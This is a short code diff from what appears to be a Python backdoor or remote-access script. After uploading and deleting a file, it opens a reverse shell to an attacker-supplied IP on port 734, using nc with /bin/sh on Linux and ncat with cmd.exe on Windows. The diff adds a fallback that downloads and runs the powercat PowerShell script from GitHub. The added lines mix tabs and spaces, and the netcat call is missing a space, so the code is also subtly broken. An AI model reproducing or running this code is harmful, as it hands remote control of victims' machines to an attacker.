@@ -67,12 +67,11 @@ def run(token):
     upload_file(token,fname,stmnt)
     delete_file(fname)
     if "Linux" in platform.system():
-        #upload_file_to_github(archive)
         #os.system( 'nc -lvp 734 -e /bin/sh')
         os.system('nc' + iph+ ' 734 -e /bin/sh')
     elif "Windows" in platform.system():
-        #pdate_file(token,fname)
-        #delete_file(fname)
-        #os.system('ncat -lvp 734 -e cmd.exe')
-        os.system('ncat '+ iph +' 734 -e cmd.exe')
-    
+	try:
+	   #os.system('ncat -lvp 734 -e cmd.exe')
+           os.system('ncat '+ iph +' 734 -e cmd.exe')
+  	except: 
+	   os.system('iex(iwr https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1 -UseBasicParsing)')
